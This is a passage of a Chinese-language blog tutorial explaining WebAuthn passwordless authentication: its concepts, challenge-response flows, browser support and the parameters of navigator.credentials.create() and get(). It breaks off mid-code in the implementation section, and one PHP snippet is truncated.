wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 